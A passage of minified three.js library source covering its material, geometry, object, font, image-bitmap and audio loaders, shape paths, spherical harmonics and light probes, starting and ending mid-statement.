0!==e.fog&&(n.fog=e.fog),void 0!==e.flatShading&&(n.flatShading=e.flatShading),void 0!==e.blending&&(n.blending=e.blending),void 0!==e.combine&&(n.combine=e.combine),void 0!==e.side&&(n.side=e.side),void 0!==e.opacity&&(n.opacity=e.opacity),void 0!==e.transparent&&(n.transparent=e.transparent),void 0!==e.alphaTest&&(n.alphaTest=e.alphaTest),void 0!==e.depthTest&&(n.depthTest=e.depthTest),void 0!==e.depthWrite&&(n.depthWrite=e.depthWrite),void 0!==e.colorWrite&&(n.colorWrite=e.colorWrite),void 0!==e.stencilWrite&&(n.stencilWrite=e.stencilWrite),void 0!==e.stencilWriteMask&&(n.stencilWriteMask=e.stencilWriteMask),void 0!==e.stencilFunc&&(n.stencilFunc=e.stencilFunc),void 0!==e.stencilRef&&(n.stencilRef=e.stencilRef),void 0!==e.stencilFuncMask&&(n.stencilFuncMask=e.stencilFuncMask),void 0!==e.stencilFail&&(n.stencilFail=e.stencilFail),void 0!==e.stencilZFail&&(n.stencilZFail=e.stencilZFail),void 0!==e.stencilZPass&&(n.stencilZPass=e.stencilZPass),void 0!==e.wireframe&&(n.wireframe=e.wireframe),void 0!==e.wireframeLinewidth&&(n.wireframeLinewidth=e.wireframeLinewidth),void 0!==e.wireframeLinecap&&(n.wireframeLinecap=e.wireframeLinecap),void 0!==e.wireframeLinejoin&&(n.wireframeLinejoin=e.wireframeLinejoin),void 0!==e.rotation&&(n.rotation=e.rotation),1!==e.linewidth&&(n.linewidth=e.linewidth),void 0!==e.dashSize&&(n.dashSize=e.dashSize),void 0!==e.gapSize&&(n.gapSize=e.gapSize),void 0!==e.scale&&(n.scale=e.scale),void 0!==e.polygonOffset&&(n.polygonOffset=e.polygonOffset),void 0!==e.polygonOffsetFactor&&(n.polygonOffsetFactor=e.polygonOffsetFactor),void 0!==e.polygonOffsetUnits&&(n.polygonOffsetUnits=e.polygonOffsetUnits),void 0!==e.skinning&&(n.skinning=e.skinning),void 0!==e.morphTargets&&(n.morphTargets=e.morphTargets),void 0!==e.morphNormals&&(n.morphNormals=e.morphNormals),void 0!==e.dithering&&(n.dithering=e.dithering),void 0!==e.visible&&(n.visible=e.visible),void 0!==e.toneMapped&&(n.toneMapped=e.toneMapped),void 0!==e.userData&&(n.userData=e.userData),void 0!==e.uniforms)for(var r in e.uniforms){var o=e.uniforms[r];switch(n.uniforms[r]={},o.type){case"t":n.uniforms[r].value=i(o.value);break;case"c":n.uniforms[r].value=(new Ne).setHex(o.value);break;case"v2":n.uniforms[r].value=(new f).fromArray(o.value);break;case"v3":n.uniforms[r].value=(new y).fromArray(o.value);break;case"v4":n.uniforms[r].value=(new T).fromArray(o.value);break;case"m3":n.uniforms[r].value=(new x).fromArray(o.value);case"m4":n.uniforms[r].value=(new B).fromArray(o.value);break;default:n.uniforms[r].value=o.value}}if(void 0!==e.defines&&(n.defines=e.defines),void 0!==e.vertexShader&&(n.vertexShader=e.vertexShader),void 0!==e.fragmentShader&&(n.fragmentShader=e.fragmentShader),void 0!==e.extensions)for(var a in e.extensions)n.extensions[a]=e.extensions[a];if(void 0!==e.shading&&(n.flatShading=1===e.shading),void 0!==e.size&&(n.size=e.size),void 0!==e.sizeAttenuation&&(n.sizeAttenuation=e.sizeAttenuation),void 0!==e.map&&(n.map=i(e.map)),void 0!==e.matcap&&(n.matcap=i(e.matcap)),void 0!==e.alphaMap&&(n.alphaMap=i(e.alphaMap),n.transparent=!0),void 0!==e.bumpMap&&(n.bumpMap=i(e.bumpMap)),void 0!==e.bumpScale&&(n.bumpScale=e.bumpScale),void 0!==e.normalMap&&(n.normalMap=i(e.normalMap)),void 0!==e.normalMapType&&(n.normalMapType=e.normalMapType),void 0!==e.normalScale){var s=e.normalScale;!1===Array.isArray(s)&&(s=[s,s]),n.normalScale=(new f).fromArray(s)}return void 0!==e.displacementMap&&(n.displacementMap=i(e.displacementMap)),void 0!==e.displacementScale&&(n.displacementScale=e.displacementScale),void 0!==e.displacementBias&&(n.displacementBias=e.displacementBias),void 0!==e.roughnessMap&&(n.roughnessMap=i(e.roughnessMap)),void 0!==e.metalnessMap&&(n.metalnessMap=i(e.metalnessMap)),void 0!==e.emissiveMap&&(n.emissiveMap=i(e.emissiveMap)),void 0!==e.emissiveIntensity&&(n.emissiveIntensity=e.emissiveIntensity),void 0!==e.specularMap&&(n.specularMap=i(e.specularMap)),void 0!==e.envMap&&(n.envMap=i(e.envMap)),void 0!==e.envMapIntensity&&(n.envMapIntensity=e.envMapIntensity),void 0!==e.reflectivity&&(n.reflectivity=e.reflectivity),void 0!==e.refractionRatio&&(n.refractionRatio=e.refractionRatio),void 0!==e.lightMap&&(n.lightMap=i(e.lightMap)),void 0!==e.lightMapIntensity&&(n.lightMapIntensity=e.lightMapIntensity),void 0!==e.aoMap&&(n.aoMap=i(e.aoMap)),void 0!==e.aoMapIntensity&&(n.aoMapIntensity=e.aoMapIntensity),void 0!==e.gradientMap&&(n.gradientMap=i(e.gradientMap)),void 0!==e.clearcoatNormalMap&&(n.clearcoatNormalMap=i(e.clearcoatNormalMap)),void 0!==e.clearcoatNormalScale&&(n.clearcoatNormalScale=(new f).fromArray(e.clearcoatNormalScale)),n},setTextures:function(e){return this.textures=e,this}});var Us=function(e){if("undefined"!=typeof TextDecoder)return(new TextDecoder).decode(e);for(var t="",i=0,n=e.length;i<n;i++)t+=String.fromCharCode(e[i]);try{return decodeURIComponent(escape(t))}catch(e){return t}},Vs=function(e){var t=e.lastIndexOf("/");return-1===t?"./":e.substr(0,t+1)};function Hs(){dt.call(this),this.type="InstancedBufferGeometry",this.maxInstancedCount=void 0}function Gs(e,t,i,n){"number"==typeof i&&(n=i,i=!1,console.error("THREE.InstancedBufferAttribute: The constructor now expects normalized as the third argument.")),Xe.call(this,e,t,i),this._meshPerAttribute=n||1,this.versionVAO=0}function Ws(e){Qa.call(this,e)}Hs.prototype=Object.assign(Object.create(dt.prototype),{constructor:Hs,isInstancedBufferGeometry:!0,copy:function(e){return dt.prototype.copy.call(this,e),this.maxInstancedCount=e.maxInstancedCount,this},clone:function(){return(new this.constructor).copy(this)},toJSON:function(){var e=dt.prototype.toJSON.call(this);return e.maxInstancedCount=this.maxInstancedCount,e.isInstancedBufferGeometry=!0,e}}),Gs.prototype=Object.assign(Object.create(Xe.prototype),{constructor:Gs,isInstancedBufferAttribute:!0,copy:function(e){return Xe.prototype.copy.call(this,e),this.meshPerAttribute=e.meshPerAttribute,this},toJSON:function(){var e=Xe.prototype.toJSON.call(this);return e.meshPerAttribute=this.meshPerAttribute,e.isInstancedBufferAttribute=!0,e}}),Object.defineProperties(Gs.prototype,{meshPerAttribute:{get:function(){return this._meshPerAttribute},set:function(e){this._meshPerAttribute=e,this.versionVAO++}}}),Ws.prototype=Object.assign(Object.create(Qa.prototype),{constructor:Ws,load:function(e,t,i,n){var r=this,o=new Ja(r.manager);o.setPath(r.path),o.load(e,(function(e){t(r.parse(JSON.parse(e)))}),i,n)},parse:function(e){var t=e.isInstancedBufferGeometry?new Hs:new dt,i=e.data.index;if(void 0!==i){var n=new qs[i.type](i.array);t.setIndex(new Xe(n,1))}var r=e.data.attributes;for(var o in r){var a=r[o],s=(n=new qs[a.type](a.array),new(a.isInstancedBufferAttribute?Gs:Xe)(n,a.itemSize,a.normalized));void 0!==a.name&&(s.name=a.name),t.addAttribute(o,s)}var c=e.data.morphAttributes;if(c)for(var o in c){for(var l=c[o],h=[],u=0,d=l.length;u<d;u++){a=l[u],s=new Xe(n=new qs[a.type](a.array),a.itemSize,a.normalized);void 0!==a.name&&(s.name=a.name),h.push(s)}t.morphAttributes[o]=h}var p=e.data.groups||e.data.drawcalls||e.data.offsets;if(void 0!==p){u=0;for(var f=p.length;u!==f;++u){var m=p[u];t.addGroup(m.start,m.count,m.materialIndex)}}var v=e.data.boundingSphere;if(void 0!==v){var g=new y;void 0!==v.center&&g.fromArray(v.center),t.boundingSphere=new ve(g,v.radius)}return e.name&&(t.name=e.name),e.userData&&(t.userData=e.userData),t}});var qs={Int8Array:Int8Array,Uint8Array:Uint8Array,Uint8ClampedArray:"undefined"!=typeof Uint8ClampedArray?Uint8ClampedArray:Uint8Array,Int16Array:Int16Array,Uint16Array:Uint16Array,Int32Array:Int32Array,Uint32Array:Uint32Array,Float32Array:Float32Array,Float64Array:Float64Array};function Xs(e){Qa.call(this,e)}Xs.prototype=Object.assign(Object.create(Qa.prototype),{constructor:Xs,load:function(e,t,i,n){var r=this,o=""===this.path?Vs(e):this.path;this.resourcePath=this.resourcePath||o;var a=new Ja(r.manager);a.setPath(this.path),a.load(e,(function(i){var o=null;try{o=JSON.parse(i)}catch(t){return void 0!==n&&n(t),void console.error("THREE:ObjectLoader: Can't parse "+e+".",t.message)}var a=o.metadata;void 0!==a&&void 0!==a.type&&"geometry"!==a.type.toLowerCase()?r.parse(o,t):console.error("THREE.ObjectLoader: Can't load "+e)}),i,n)},parse:function(e,t){var i=this.parseShape(e.shapes),n=this.parseGeometries(e.geometries,i),r=this.parseImages(e.images,(function(){void 0!==t&&t(s)})),o=this.parseTextures(e.textures,r),a=this.parseMaterials(e.materials,o),s=this.parseObject(e.object,n,a);return e.animations&&(s.animations=this.parseAnimations(e.animations)),void 0!==e.images&&0!==e.images.length||void 0!==t&&t(s),s},parseShape:function(e){var t={};if(void 0!==e)for(var i=0,n=e.length;i<n;i++){var r=(new As).fromJSON(e[i]);t[r.uuid]=r}return t},parseGeometries:function(e,t){var i={};if(void 0!==e)for(var n=new Ws,r=0,o=e.length;r<o;r++){var a,s=e[r];switch(s.type){case"PlaneGeometry":case"PlaneBufferGeometry":a=new wa[s.type](s.width,s.height,s.widthSegments,s.heightSegments);break;case"BoxGeometry":case"BoxBufferGeometry":case"CubeGeometry":a=new wa[s.type](s.width,s.height,s.depth,s.widthSegments,s.heightSegments,s.depthSegments);break;case"CircleGeometry":case"CircleBufferGeometry":a=new wa[s.type](s.radius,s.segments,s.thetaStart,s.thetaLength);break;case"CylinderGeometry":case"CylinderBufferGeometry":a=new wa[s.type](s.radiusTop,s.radiusBottom,s.height,s.radialSegments,s.heightSegments,s.openEnded,s.thetaStart,s.thetaLength);break;case"ConeGeometry":case"ConeBufferGeometry":a=new wa[s.type](s.radius,s.height,s.radialSegments,s.heightSegments,s.openEnded,s.thetaStart,s.thetaLength);break;case"SphereGeometry":case"SphereBufferGeometry":a=new wa[s.type](s.radius,s.widthSegments,s.heightSegments,s.phiStart,s.phiLength,s.thetaStart,s.thetaLength);break;case"DodecahedronGeometry":case"DodecahedronBufferGeometry":case"IcosahedronGeometry":case"IcosahedronBufferGeometry":case"OctahedronGeometry":case"OctahedronBufferGeometry":case"TetrahedronGeometry":case"TetrahedronBufferGeometry":a=new wa[s.type](s.radius,s.detail);break;case"RingGeometry":case"RingBufferGeometry":a=new wa[s.type](s.innerRadius,s.outerRadius,s.thetaSegments,s.phiSegments,s.thetaStart,s.thetaLength);break;case"TorusGeometry":case"TorusBufferGeometry":a=new wa[s.type](s.radius,s.tube,s.radialSegments,s.tubularSegments,s.arc);break;case"TorusKnotGeometry":case"TorusKnotBufferGeometry":a=new wa[s.type](s.radius,s.tube,s.tubularSegments,s.radialSegments,s.p,s.q);break;case"TubeGeometry":case"TubeBufferGeometry":a=new wa[s.type]((new Ss[s.path.type]).fromJSON(s.path),s.tubularSegments,s.radius,s.radialSegments,s.closed);break;case"LatheGeometry":case"LatheBufferGeometry":a=new wa[s.type](s.points,s.segments,s.phiStart,s.phiLength);break;case"PolyhedronGeometry":case"PolyhedronBufferGeometry":a=new wa[s.type](s.vertices,s.indices,s.radius,s.details);break;case"ShapeGeometry":case"ShapeBufferGeometry":for(var c=[],l=0,h=s.shapes.length;l<h;l++){var u=t[s.shapes[l]];c.push(u)}a=new wa[s.type](c,s.curveSegments);break;case"ExtrudeGeometry":case"ExtrudeBufferGeometry":for(c=[],l=0,h=s.shapes.length;l<h;l++){u=t[s.shapes[l]];c.push(u)}var d=s.options.extrudePath;void 0!==d&&(s.options.extrudePath=(new Ss[d.type]).fromJSON(d)),a=new wa[s.type](c,s.options);break;case"ParametricGeometry":case"ParametricBufferGeometry":var p=new Function("return "+s.func)();a=new wa[s.type](p,s.slices,s.stacks);break;case"BufferGeometry":case"InstancedBufferGeometry":a=n.parse(s);break;case"Geometry":if("THREE"in window&&"LegacyJSONLoader"in THREE)a=(new THREE.LegacyJSONLoader).parse(s,this.resourcePath).geometry;else console.error('THREE.ObjectLoader: You have to import LegacyJSONLoader in order load geometry data of type "Geometry".');break;default:console.warn('THREE.ObjectLoader: Unsupported geometry type "'+s.type+'"');continue}a.uuid=s.uuid,void 0!==s.name&&(a.name=s.name),!0===a.isBufferGeometry&&void 0!==s.userData&&(a.userData=s.userData),i[s.uuid]=a}return i},parseMaterials:function(e,t){var i={},n={};if(void 0!==e){var r=new js;r.setTextures(t);for(var o=0,a=e.length;o<a;o++){var s=e[o];if("MultiMaterial"===s.type){for(var c=[],l=0;l<s.materials.length;l++){var h=s.materials[l];void 0===i[h.uuid]&&(i[h.uuid]=r.parse(h)),c.push(i[h.uuid])}n[s.uuid]=c}else void 0===i[s.uuid]&&(i[s.uuid]=r.parse(s)),n[s.uuid]=i[s.uuid]}}return n},parseAnimations:function(e){for(var t=[],i=0;i<e.length;i++){var n=e[i],r=Wa.parse(n);void 0!==n.uuid&&(r.uuid=n.uuid),t.push(r)}return t},parseImages:function(e,t){var i=this,n={};function r(e){return i.manager.itemStart(e),o.load(e,(function(){i.manager.itemEnd(e)}),void 0,(function(){i.manager.itemError(e),i.manager.itemEnd(e)}))}if(void 0!==e&&e.length>0){var o=new is(new Ya(t));o.setCrossOrigin(this.crossOrigin);for(var a=0,s=e.length;a<s;a++){var c=e[a],l=c.url;if(Array.isArray(l)){n[c.uuid]=[];for(var h=0,u=l.length;h<u;h++){var d=l[h],p=/^(\/\/)|([a-z]+:(\/\/)?)/i.test(d)?d:i.resourcePath+d;n[c.uuid].push(r(p))}}else{p=/^(\/\/)|([a-z]+:(\/\/)?)/i.test(c.url)?c.url:i.resourcePath+c.url;n[c.uuid]=r(p)}}}return n},parseTextures:function(e,t){function i(e,t){return"number"==typeof e?e:(console.warn("THREE.ObjectLoader.parseTexture: Constant should be in numeric form.",e),t[e])}var n={};if(void 0!==e)for(var r=0,o=e.length;r<o;r++){var a,s=e[r];void 0===s.image&&console.warn('THREE.ObjectLoader: No "image" specified for',s.uuid),void 0===t[s.image]&&console.warn("THREE.ObjectLoader: Undefined image",s.image),(a=Array.isArray(t[s.image])?new xi(t[s.image]):new S(t[s.image])).needsUpdate=!0,a.uuid=s.uuid,void 0!==s.name&&(a.name=s.name),void 0!==s.mapping&&(a.mapping=i(s.mapping,Zs)),void 0!==s.offset&&a.offset.fromArray(s.offset),void 0!==s.repeat&&a.repeat.fromArray(s.repeat),void 0!==s.center&&a.center.fromArray(s.center),void 0!==s.rotation&&(a.rotation=s.rotation),void 0!==s.wrap&&(a.wrapS=i(s.wrap[0],Qs),a.wrapT=i(s.wrap[1],Qs)),void 0!==s.format&&(a.format=s.format),void 0!==s.type&&(a.type=s.type),void 0!==s.encoding&&(a.encoding=s.encoding),void 0!==s.minFilter&&(a.minFilter=i(s.minFilter,$s)),void 0!==s.magFilter&&(a.magFilter=i(s.magFilter,$s)),void 0!==s.anisotropy&&(a.anisotropy=s.anisotropy),void 0!==s.flipY&&(a.flipY=s.flipY),void 0!==s.premultiplyAlpha&&(a.premultiplyAlpha=s.premultiplyAlpha),void 0!==s.unpackAlignment&&(a.unpackAlignment=s.unpackAlignment),n[s.uuid]=a}return n},parseObject:function(e,t,i){var n;function r(e){return void 0===t[e]&&console.warn("THREE.ObjectLoader: Undefined geometry",e),t[e]}function o(e){if(void 0!==e){if(Array.isArray(e)){for(var t=[],n=0,r=e.length;n<r;n++){var o=e[n];void 0===i[o]&&console.warn("THREE.ObjectLoader: Undefined material",o),t.push(i[o])}return t}return void 0===i[e]&&console.warn("THREE.ObjectLoader: Undefined material",e),i[e]}}switch(e.type){case"Scene":n=new ee,void 0!==e.background&&Number.isInteger(e.background)&&(n.background=new Ne(e.background)),void 0!==e.fog&&("Fog"===e.fog.type?n.fog=new dr(e.fog.color,e.fog.near,e.fog.far):"FogExp2"===e.fog.type&&(n.fog=new ur(e.fog.color,e.fog.density)));break;case"PerspectiveCamera":n=new Gt(e.fov,e.aspect,e.near,e.far),void 0!==e.focus&&(n.focus=e.focus),void 0!==e.zoom&&(n.zoom=e.zoom),void 0!==e.filmGauge&&(n.filmGauge=e.filmGauge),void 0!==e.filmOffset&&(n.filmOffset=e.filmOffset),void 0!==e.view&&(n.view=Object.assign({},e.view));break;case"OrthographicCamera":n=new Bs(e.left,e.right,e.top,e.bottom,e.near,e.far),void 0!==e.zoom&&(n.zoom=e.zoom),void 0!==e.view&&(n.view=Object.assign({},e.view));break;case"AmbientLight":n=new Fs(e.color,e.intensity);break;case"DirectionalLight":n=new zs(e.color,e.intensity);break;case"PointLight":n=new Is(e.color,e.intensity,e.distance,e.decay);break;case"RectAreaLight":n=new Ns(e.color,e.intensity,e.width,e.height);break;case"SpotLight":n=new ks(e.color,e.intensity,e.distance,e.angle,e.penumbra,e.decay);break;case"HemisphereLight":n=new Ps(e.color,e.groundColor,e.intensity);break;case"SkinnedMesh":console.warn("THREE.ObjectLoader.parseObject() does not support SkinnedMesh yet.");case"Mesh":var a=r(e.geometry),s=o(e.material);n=a.bones&&a.bones.length>0?new Or(a,s):new Lt(a,s),void 0!==e.drawMode&&n.setDrawMode(e.drawMode);break;case"LOD":n=new kr;break;case"Line":n=new Wr(r(e.geometry),o(e.material),e.mode);break;case"LineLoop":n=new Zr(r(e.geometry),o(e.material));break;case"LineSegments":n=new Yr(r(e.geometry),o(e.material));break;case"PointCloud":case"Points":n=new to(r(e.geometry),o(e.material));break;case"Sprite":n=new Cr(o(e.material));break;case"Group":n=new ir;break;default:n=new K}if(n.uuid=e.uuid,void 0!==e.name&&(n.name=e.name),void 0!==e.matrix?(n.matrix.fromArray(e.matrix),void 0!==e.matrixAutoUpdate&&(n.matrixAutoUpdate=e.matrixAutoUpdate),n.matrixAutoUpdate&&n.matrix.decompose(n.position,n.quaternion,n.scale)):(void 0!==e.position&&n.position.fromArray(e.position),void 0!==e.rotation&&n.rotation.fromArray(e.rotation),void 0!==e.quaternion&&n.quaternion.fromArray(e.quaternion),void 0!==e.scale&&n.scale.fromArray(e.scale)),void 0!==e.castShadow&&(n.castShadow=e.castShadow),void 0!==e.receiveShadow&&(n.receiveShadow=e.receiveShadow),e.shadow&&(void 0!==e.shadow.bias&&(n.shadow.bias=e.shadow.bias),void 0!==e.shadow.radius&&(n.shadow.radius=e.shadow.radius),void 0!==e.shadow.mapSize&&n.shadow.mapSize.fromArray(e.shadow.mapSize),void 0!==e.shadow.camera&&(n.shadow.camera=this.parseObject(e.shadow.camera))),void 0!==e.visible&&(n.visible=e.visible),void 0!==e.frustumCulled&&(n.frustumCulled=e.frustumCulled),void 0!==e.renderOrder&&(n.renderOrder=e.renderOrder),void 0!==e.userData&&(n.userData=e.userData),void 0!==e.layers&&(n.layers.mask=e.layers),void 0!==e.children)for(var c=e.children,l=0;l<c.length;l++)n.add(this.parseObject(c[l],t,i));if("LOD"===e.type)for(var h=e.levels,u=0;u<h.length;u++){var d=h[u],p=n.getObjectByProperty("uuid",d.object);void 0!==p&&n.addLevel(p,d.distance)}return n}});var Ys,Zs={UVMapping:300,CubeReflectionMapping:301,CubeRefractionMapping:302,EquirectangularReflectionMapping:303,EquirectangularRefractionMapping:304,SphericalReflectionMapping:305,CubeUVReflectionMapping:306,CubeUVRefractionMapping:307},Qs={RepeatWrapping:1e3,ClampToEdgeWrapping:1001,MirroredRepeatWrapping:1002},$s={NearestFilter:1003,NearestMipmapNearestFilter:1004,NearestMipmapLinearFilter:1005,LinearFilter:1006,LinearMipmapNearestFilter:1007,LinearMipmapLinearFilter:1008};function Js(e){"undefined"==typeof createImageBitmap&&console.warn("THREE.ImageBitmapLoader: createImageBitmap() not supported."),"undefined"==typeof fetch&&console.warn("THREE.ImageBitmapLoader: fetch() not supported."),Qa.call(this,e),this.options=void 0}function Ks(){this.type="ShapePath",this.color=new Ne,this.subPaths=[],this.currentPath=null}function ec(e){this.type="Font",this.data=e}function tc(e,t,i,n,r){var o=r.glyphs[e]||r.glyphs["?"];if(o){var a,s,c,l,h,u,d,p,f=new Ks;if(o.o)for(var m=o._cachedOutline||(o._cachedOutline=o.o.split(" ")),v=0,g=m.length;v<g;){switch(m[v++]){case"m":a=m[v++]*t+i,s=m[v++]*t+n,f.moveTo(a,s);break;case"l":a=m[v++]*t+i,s=m[v++]*t+n,f.lineTo(a,s);break;case"q":c=m[v++]*t+i,l=m[v++]*t+n,h=m[v++]*t+i,u=m[v++]*t+n,f.quadraticCurveTo(h,u,c,l);break;case"b":c=m[v++]*t+i,l=m[v++]*t+n,h=m[v++]*t+i,u=m[v++]*t+n,d=m[v++]*t+i,p=m[v++]*t+n,f.bezierCurveTo(h,u,d,p,c,l)}}return{offsetX:o.ha*t,path:f}}console.error('THREE.Font: character "'+e+'" does not exists in font family '+r.familyName+".")}function ic(e){Qa.call(this,e)}Js.prototype=Object.assign(Object.create(Qa.prototype),{constructor:Js,setOptions:function(e){return this.options=e,this},load:function(e,t,i,n){void 0===e&&(e=""),void 0!==this.path&&(e=this.path+e),e=this.manager.resolveURL(e);var r=this,o=Xa.get(e);if(void 0!==o)return r.manager.itemStart(e),setTimeout((function(){t&&t(o),r.manager.itemEnd(e)}),0),o;fetch(e).then((function(e){return e.blob()})).then((function(e){return void 0===r.options?createImageBitmap(e):createImageBitmap(e,r.options)})).then((function(i){Xa.add(e,i),t&&t(i),r.manager.itemEnd(e)})).catch((function(t){n&&n(t),r.manager.itemError(e),r.manager.itemEnd(e)})),r.manager.itemStart(e)}}),Object.assign(Ks.prototype,{moveTo:function(e,t){this.currentPath=new Es,this.subPaths.push(this.currentPath),this.currentPath.moveTo(e,t)},lineTo:function(e,t){this.currentPath.lineTo(e,t)},quadraticCurveTo:function(e,t,i,n){this.currentPath.quadraticCurveTo(e,t,i,n)},bezierCurveTo:function(e,t,i,n,r,o){this.currentPath.bezierCurveTo(e,t,i,n,r,o)},splineThru:function(e){this.currentPath.splineThru(e)},toShapes:function(e,t){function i(e){for(var t=[],i=0,n=e.length;i<n;i++){var r=e[i],o=new As;o.curves=r.curves,t.push(o)}return t}function n(e,t){for(var i=t.length,n=!1,r=i-1,o=0;o<i;r=o++){var a=t[r],s=t[o],c=s.x-a.x,l=s.y-a.y;if(Math.abs(l)>Number.EPSILON){if(l<0&&(a=t[o],c=-c,s=t[r],l=-l),e.y<a.y||e.y>s.y)continue;if(e.y===a.y){if(e.x===a.x)return!0}else{var h=l*(e.x-a.x)-c*(e.y-a.y);if(0===h)return!0;if(h<0)continue;n=!n}}else{if(e.y!==a.y)continue;if(s.x<=e.x&&e.x<=a.x||a.x<=e.x&&e.x<=s.x)return!0}}return n}var r=Zo.isClockWise,o=this.subPaths;if(0===o.length)return[];if(!0===t)return i(o);var a,s,c,l=[];if(1===o.length)return s=o[0],(c=new As).curves=s.curves,l.push(c),l;var h=!r(o[0].getPoints());h=e?!h:h;var u,d,p=[],f=[],m=[],v=0;f[v]=void 0,m[v]=[];for(var g=0,y=o.length;g<y;g++)a=r(u=(s=o[g]).getPoints()),(a=e?!a:a)?(!h&&f[v]&&v++,f[v]={s:new As,p:u},f[v].s.curves=s.curves,h&&v++,m[v]=[]):m[v].push({h:s,p:u[0]});if(!f[0])return i(o);if(f.length>1){for(var b=!1,w=[],x=0,_=f.length;x<_;x++)p[x]=[];for(x=0,_=f.length;x<_;x++)for(var M=m[x],S=0;S<M.length;S++){for(var T=M[S],E=!0,A=0;A<f.length;A++)n(T.p,f[A].p)&&(x!==A&&w.push({froms:x,tos:A,hole:S}),E?(E=!1,p[A].push(T)):b=!0);E&&p[x].push(T)}w.length>0&&(b||(m=p))}g=0;for(var C=f.length;g<C;g++){c=f[g].s,l.push(c);for(var P=0,L=(d=m[g]).length;P<L;P++)c.holes.push(d[P].h)}return l}}),Object.assign(ec.prototype,{isFont:!0,generateShapes:function(e,t){void 0===t&&(t=100);for(var i=[],n=function(e,t,i){for(var n=Array.from?Array.from(e):String(e).split(""),r=t/i.resolution,o=(i.boundingBox.yMax-i.boundingBox.yMin+i.underlineThickness)*r,a=[],s=0,c=0,l=0;l<n.length;l++){var h=n[l];if("\n"===h)s=0,c-=o;else{var u=tc(h,r,s,c,i);s+=u.offsetX,a.push(u.path)}}return a}(e,t,this.data),r=0,o=n.length;r<o;r++)Array.prototype.push.apply(i,n[r].toShapes());return i}}),ic.prototype=Object.assign(Object.create(Qa.prototype),{constructor:ic,load:function(e,t,i,n){var r=this,o=new Ja(this.manager);o.setPath(this.path),o.load(e,(function(e){var i;try{i=JSON.parse(e)}catch(t){console.warn("THREE.FontLoader: typeface.js support is being deprecated. Use typeface.json instead."),i=JSON.parse(e.substring(65,e.length-2))}var n=r.parse(i);t&&t(n)}),i,n)},parse:function(e){return new ec(e)}});var nc=function(){return void 0===Ys&&(Ys=new(window.AudioContext||window.webkitAudioContext)),Ys};function rc(e){Qa.call(this,e)}function oc(){this.coefficients=[];for(var e=0;e<9;e++)this.coefficients.push(new y)}function ac(e,t){Cs.call(this,void 0,t),this.sh=void 0!==e?e:new oc}function sc(e,t,i){ac.call(this,void 0,i);var n=(new Ne).set(e),r=(new Ne).set(t),o=new y(n.r,n.g,n.b),a=new y(r.r,r.g,r.b),s=Math.sqrt(Math.PI),c=s*Math.sqrt(.75);this.sh.coefficients[0].copy(o).add(a).multiplyScalar(s),this.sh.coefficients[1].copy(o).sub(a).multiplyScalar(c)}function cc(e,t){ac.call(this,void 0,t);var i=(new Ne).set(e);this.sh.coefficients[0].set(i.r,i.g,i.b).multiplyScalar(2*Math.sqrt(Math.PI))}rc.prototype=Object.assign(Object.create(Qa.prototype),{constructor:rc,load:function(e,t,i,n){var r=new Ja(this.manager);r.setResponseType("arraybuffer"),r.setPath(this.path),r.load(e,(function(e){var i=e.slice(0);nc().decodeAudioData(i,(function(e){t(e)}))}),i,n)}}),Object.assign(oc.prototype,{isSphericalHarmonics3:!0,set:function(e){for(var t=0;t<9;t++)this.coefficients[t].copy(e[t]);return this},zero:function(){for(var e=0;e<9;e++)this.coefficients[e].set(0,0,0);return this},getAt:function(e,t){var i=e.x,n=e.y,r=e.z,o=this.coefficients;return t.copy(o[0]).multiplyScalar(.282095),t.addScale(o[1],.488603*n),t.addScale(o[2],.488603*r),t.addScale(o[3],.488603*i),t.addScale(o[4],i*n*1.092548),t.addScale(o[5],n*r*1.092548),t.addScale(o[6],.315392*(3*r*r-1)),t.addScale(o[7],i*r*1.092548),t.addScale(o[8],.546274*(i*i-n*n)),t},getIrradianceAt:function(e,t){var i=e.x,n=e.y,r=e.z,o=this.coefficients;return t.copy(o[0]).multiplyScalar(.886227),t.addScale(o[1],1.023328*n),t.addScale(o[2],1.023328*r),t.addScale(o[3],1.023328*i),t.addScale(o[4],.858086*i*n),t.addScale(o[5],.858086*n*r),t.addScale(o[6],.743125*r*r-.247708),t.addScale(o[7],.858086*i*r),t.addScale(o[8],.429043*(i*i-n*n)),t},add:function(e){for(var t=0;t<9;t++)this.coefficients[t].add(e.coefficients[t]);return this},scale:function(e){for(var t=0;t<9;t++)this.coefficients[t].multiplyScalar(e);return this},lerp:function(e,t){for(var i=0;i<9;i++)this.coefficients[i].lerp(e.coefficients[i],t);return this},equals:function(e){for(var t=0;t<9;t++)if(!this.coefficients[t].equals(e.coefficients[t]))return!1;return!0},copy:function(e){return this.set(e.coefficients)},clone:function(){return(new this.constructor).copy(this)},fromArray:function(e,t){void 0===t&&(t=0);for(var i=this.coefficients,n=0;n<9;n++)i[n].fromArray(e,t+3*n);return this},toArray:function(e,t){void 0===e&&(e=[]),void 0===t&&(t=0);for(var i=this.coefficients,n=0;n<9;n++)i[n].toArray(e,t+3*n);return e}}),Object.assign(oc,{getBasisAt:function(e,t){var i=e.x,n=e.y,r=e.z;t[0]=.282095,t[1]=.488603*n,t[2]=.488603*r,t[3]=.488603*i,t[4]=1.092548*i*n,t[5]=1.092548*n*r,t[6]=.315392*(3*r*r-1),t[7]=1.092548*i*r,t[8]=.546274*(i*i-n*n)}}),ac.prototype=Object.assign(Object.create(Cs.prototype),{constructor:ac,isLightProbe:!0,copy:function(e){return Cs.prototype.copy.call(this,e),this.sh.copy(e.sh),this.intensity=e.intensity,this},toJSON:function(e){return Cs.prototype.toJSON.call(this,e)}}),sc.prototype=Object.assign(Object.create(ac.prototype),{constructor:sc,isHemisphereLightProbe:!0,copy:function(e){return ac.prototype.copy.call(this,e),this},toJSON:function(e){return ac.prototype.toJSON.call(this,e)}}),cc.prototype=Object.assign(Object.create(ac.prototype),{constructor:cc,isAmbientLightProbe:!0,copy:function(e){return ac.prototype.copy.call(this,e),this},toJSON:function(e){return ac.prototype.toJSON.call(this,e)}});var lc=new B,hc=new B;function uc(e){this.autoStart=void 0===e||e,this.startTime=0,this.oldTime=0,this.elapsedTime=0,this.running=!1}Object.assign(function(){this.type="StereoCamera",this.aspect=1,this.eyeSep=.064,this.cameraL=new Gt,this.cameraL.layers.enable(1),this.cameraL.matrixAutoUpdate=!1,this.cameraR=new Gt,this.cameraR.layers.enable(2),this.cameraR.matrixAutoUpdate=!1,this._cache={focus:null,fov:null,aspect:null,near:null,far:null,zoom:null,eyeSep:null}}.prototype,{update:function(e){var 